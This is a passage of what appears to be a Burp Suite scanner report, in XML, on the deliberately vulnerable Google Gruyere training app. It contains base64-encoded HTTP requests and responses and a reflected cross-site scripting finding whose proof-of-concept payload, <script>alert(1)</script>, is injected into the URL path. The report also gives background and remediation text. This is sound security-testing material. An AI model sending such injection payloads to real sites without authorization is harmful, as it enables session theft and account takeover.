ZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBTaWduIHVwPC9oMj4KCjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8aDM+U2lnbiB1cCBmb3IgYSBuZXcgYWNjb3VudC48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0nbmV3Jz4KCjx0YWJsZT48dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VpZCcgdmFsdWU9JycgbWF4bGVuZ3RoPScxNic+CjwvdGQ+PC90cj4KPHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CjwvdGQ+PC90cj4KCgo8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdp9hdXRob3InIHZhbHVlPSdUcnVlJz4KCjx0cj48dGQ+PC90ZD48dGQgYWxpZ249J3JpZ2h0Jz4KICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgYWNjb3VudCc+CjwvdGQ+PC90cj4KPC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>352643544456578048</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>ndspt&lt;script&gt;alert(1)&lt;/script&gt;nqhzz</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGxuZHNwdCUzY3NjcmlwdCUzZWFsZXJ0KDEpJTNjL3NjcmlwdCUzZW5xaHp6IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZmJkN2Q3ZjkyZjczY2U1MTNiNjlmYmUxMDkxNmE4NTgNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjowMiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY3NA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL25ld2FjY291bnQuZ3RsbmRzcHQ8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+bnFoeno8L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>34294152130426960</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGx4cWk2b2xidmFxIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNzc5ZGNiMDQxMDA5ODRhZDc4ODY3NGM4YTMzZWRkNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0NSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY1OA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNj